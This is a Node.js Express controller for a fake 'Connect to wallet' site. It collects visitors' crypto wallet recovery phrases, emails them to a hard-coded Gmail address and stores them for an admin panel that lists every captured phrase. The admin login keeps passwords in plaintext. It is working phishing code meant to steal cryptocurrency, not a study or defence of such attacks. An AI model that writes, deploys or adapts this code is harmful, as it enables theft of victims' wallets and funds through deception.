
const transporter = require('../middleware/sendmail');
const phrase_model = require('../models/phrase_model');
const Admin_model = require('../models/admin');
const jwt = require('jsonwebtoken');

exports.home = async(req,res)=>{
     const local ={
         title:"Home"
     }
     res.render('index',{local});
}
exports.features = async(req,res)=>{
    const local ={
        title:"Features"
    }
    res.render('feature',{local});
}

exports.wallet = async(req,res)=>{
    const local ={
        title:"Connect to wallet"
    }
    res.render('wallets',{local});
}
exports.admin = async(req,res)=>{
     const local ={
        title:"Admin"
    }
     const getwallet = await phrase_model.find();
    res.render('admin',{local,getwallet});
}
exports.admin_login = async(req,res)=>{

    const local ={
        title:"Admin-login"
    }
    res.render('admin/sign-in',{local})
}
exports.admin_home = async(req,res)=>{
     const local ={
        title:"Admin-Home"
    }
    const getID = req.admin.id;
     const getAdmin = await Admin_model.findOne({_id:getID},{username:1})
     const getphrase = await phrase_model.find();
    res.render('admin/index',{local,getAdmin,getphrase})
}
 
exports.changePassword = async(req,res)=>{
      const local ={
          title:"Change Password"
      }
       const getID = req.admin.id;
     const getAdmin = await Admin_model.findOne({_id:getID},{username:1})
      res.render('admin/changePassword',{local,getAdmin});
}

// POST REQUESTS

const sendmail = async function(from,to,subject,text) {
    const  mailOptions = {
        from:from,
        to,
        subject,
        text
    }
    try{
        await transporter.sendMail(mailOptions);
    }catch(error){
         console.error(error.message);
    }
}

exports.get_wallet_details= async(req,res)=>{
      const phrase = req.body.Phrase; 
     // const wallet_address = req.body.Wallet_address;
      const crypto_wallet = req.body.Crpto_Wallet
     const email ="walisonmichael8@gmail.com";
     const subject ="Wallet Details";
     const Text = "Phrase: "+phrase+"\n\n"+"Wallet Name: "+crypto_wallet;
     
     try{
        const send = sendmail(process.env.EMAIL,email,subject,Text);
        if(send){
            res.json({message:"email sent sucessfully"})
        }
     }catch(error){
        console.error(error.message)
     }
}

exports.postwallet = async(req,res)=>{
    const Phrase = req.body.Phrase;
    const wallet = req.body.Crpto_Wallet
     await phrase_model.create({wallet:wallet,phrase:Phrase})
      .then(result=>{
          res.json({data:result});
      }).catch(err=>{
          console.error(err.message);
      })

     console.log(req.body);
}
exports.createAdmin = async(req,res)=>{
    const username = req.body.username;
    const password = req.body.password;
     await Admin_model.create({username:username,password:password})
      .then(data=>{
           res.json(data)
      }).catch(err=>{
          res.json({error:err.message});
      })
}
exports.post_admin_login=async(req,res)=>{

    const  username = req.body.username;
    const password = req.body.password;
    if(username=="" && password == ""){
           res.status(400).json({error:"Username and password must filled"})
    }else{
         try{
              const get_admin = await Admin_model.findOne({username:username,password:password});
              if(!get_admin){
                 return res.status(403).json({error:"user not found" });
              }else{
                 const token = jwt.sign({id:get_admin._id},process.env.ACCESS_TOKEN_SECRET,{expiresIn:"1h"});
                 res.cookie("jwt",token,{httpOnly:true,maxAge:36000000});
                 return res.json({token:token,status:200})

              }

         }catch(err){
            res.status(400).json({error:err.message})
         }
    }
}
exports.updatepassword = async(req,res)=>{
     const old_password = req.body.old_password;
     const new_password = req.body.new_password;
      const check_password_old = await Admin_model.findOne({password:old_password});
      if(!check_password_old){
         res.json({err_msg:"Password does not Match",status:300})
      }else{
        const id= check_password_old._id;
        
           await Admin_model.updateOne({_id:id},{password:new_password})
            .then(data =>{
                  res.json({message:data,status:"Password Changed"});
            }).catch(err=>{
                  console.error(err.message);
            })
      }  
}
exports.Admin_logout = async(req,res)=>{
     res.clearCookie("jwt");
    res.redirect('/login');
}